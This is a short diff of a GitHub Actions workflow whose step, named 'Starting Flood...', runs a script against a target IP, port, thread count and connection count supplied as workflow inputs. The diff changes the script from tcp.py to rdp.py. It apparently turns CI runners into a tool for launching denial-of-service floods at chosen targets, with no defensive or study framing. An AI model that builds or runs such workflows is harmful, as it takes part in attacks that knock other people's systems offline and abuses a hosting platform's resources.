@@ -35,4 +35,4 @@ jobs:
         if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
     - name: Starting Flood...
       run: |
-        python tcp.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.conn }}
+        python rdp.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.conn }}
